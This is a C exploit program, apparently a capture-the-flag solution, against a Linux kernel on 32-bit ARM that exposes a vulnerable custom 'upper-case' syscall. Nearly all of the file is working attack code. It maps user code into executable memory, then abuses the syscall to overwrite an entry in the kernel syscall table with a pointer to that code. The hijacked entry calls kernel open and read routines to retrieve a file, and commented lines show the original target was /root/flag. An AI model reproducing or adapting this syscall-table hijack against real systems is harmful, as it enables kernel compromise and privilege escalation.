#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>

// modify the below based on what you see in /proc/kallsyms
#define SYS_CALL_TABLE_BASE 0x8000e348      // sys_call_table
#define PRINTK_ADDR         0x8035fd9c      // printk
#define SYS_OPEN            0x800bdb60      // sys_openat
#define SYS_READ            0x800beb34      // sys_read
#define SYS_WRITE           0x800beb9c      // sys_write
#define NR_SYS_UPPER_CASE	223             // the unused syscall number we hijack

#define KB 1024
#define MB (KB) * (KB)
#define BUFF_SIZE (KB)*1

typedef uint32_t u32;


/*
   Compile with -no-pie

   gcc -no-pie -o exploit exploit.c
   */




/* 
   asmlinkage long sys_upper(char *in, char* out);

    long do_sys_open(int dfd, const char __user *filename, int flags, umode_t mode)

    ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)

    ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
*/

//const char* flagfile = "/root/flag";
//const char* flagfile = "/home/geri/fakeflag";

//typedef int (*printer_ty)(const char *fmt, ...);
typedef long (*sys_open_ty)(int,const char*, int, unsigned);
typedef long (*sys_read_ty)(int,char*, unsigned);
typedef long (*sys_write_ty)(int,const char*, unsigned);

//typedef long (*sys_call)(void);

int sys_open(const char  *filename, int flags, int mode)
{
    long fd;
    const char* fn = filename;
    int fl = flags;
    int m = mode;
    fd = ((sys_open_ty)SYS_OPEN)(-100, fn, fl, m);
    return fd;
}


int sys_read(int fd, char* buf, unsigned len)
{
    int read = 0;
    read = ((sys_read_ty)SYS_READ)(fd, buf, len);
    return read;
}

int sys_write(int fd, const char* buf, unsigned len)
{
    int written = 0;
    written = ((sys_write_ty)SYS_WRITE)(fd, buf, len);
    return written;
}

int read_file(char* path, char* buf)
{
    char ff[32];
    int i;
    for(i=0;i<sizeof(ff);i++) {
        ff[i] = '\0';
    }
    //const char* flagfile = "/root/flag";
    //ff[0] = '/'; ff[1] = 'r'; ff[2] = 'o'; ff[3] = 'o';
    //ff[4] = 't'; ff[5] = '/'; ff[6] = 'f'; ff[7] = 'l';
    //ff[8] = 'a'; ff[9] = 'g'; ff[10] = '\0'; 
    ff[0] = '/'; ff[1] = 't'; ff[2] = 'm'; ff[3] = 'p';
    ff[4] = '/'; ff[5] = 'm'; ff[6] = '/'; ff[7] = 'l';
    ff[8] = '\0';
    //printer_ty prin = (printer_ty)PRINTK_ADDR;
    int fd = sys_open(ff, O_RDONLY, 0);
    //prin("Inside read_file - open: %d\n", fd);
    unsigned r = sys_read(fd, buf, 31); 
    return fd;
}


long lower_to_upper(char* from, char* to)
{
    return syscall(NR_SYS_UPPER_CASE, from, to);
} 

void cop_addr(char* to, char* from)
{
    int i;
    for(i=0;i<4;i++) {
        to[i] = from[i];
    }
}

#define AL_SZ (4096 * 8)


int main(int argc, char** argv)
{
    void* remapped_addr = atoi(argv[1]);
    unsigned int syscall_entry_addr = SYS_CALL_TABLE_BASE + (NR_SYS_UPPER_CASE * sizeof(char*));
    
    printf("main is at: %p , read_file is at: %p\n", main, read_file);
    printf("Want to mmap code to: %p\n", remapped_addr);
    remapped_addr = mmap(remapped_addr, AL_SZ, PROT_EXEC|PROT_READ|PROT_WRITE, 
                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if(remapped_addr == MAP_FAILED) {
        printf("mmap failed.\n");
        exit(1);
    }

    printf("code got mapped to: %p\n", remapped_addr);
    memset(remapped_addr, '\x90', AL_SZ);

    void* map_start = (void*)0x00008000;
    void* map_end =   (void*)0x00009000;
    int len = map_end - map_start;
    printf("Code length to be copied: %d\n", len);

    // make a little offset here to avoid lower case value byte - might need to manually change!
    remapped_addr += 0x20;

    memcpy(remapped_addr, map_start, len);
    u32 our_rmaped_func = (u32)remapped_addr + ((u32)read_file - (u32)map_start);
    printf("readfile addr: %p offset: %u -> Address of remapped func: %p\n",
            read_file, ((u32)read_file - (u32)map_start), (void*)our_rmaped_func );

    char fun[5];
    memset(fun, 0 , sizeof(fun));
    cop_addr(fun, (char*)&our_rmaped_func);
    printf("Hit enter to copy our callback %p to syscall table slot: %p\n", (void*)*(unsigned int*)fun,
                                                                            (void*)syscall_entry_addr);
    getchar();
    lower_to_upper(fun, (char*)syscall_entry_addr);
//    validate((char*)syscall_entry_addr, fun);

    char store[32];
    memset(store, 0 , sizeof(store));
    printf("Data will be placed at: %p\n", store);
    printf("Hit enter to get our callback triggered!\n");
    getchar();

    int fd = lower_to_upper(store, store);
    
    printf("We have an open fd: %d\n", fd);
    int r = read(fd, store,  sizeof(store));
    printf("Read: %d, data: %s\n", r, store); 


    return 0;
}

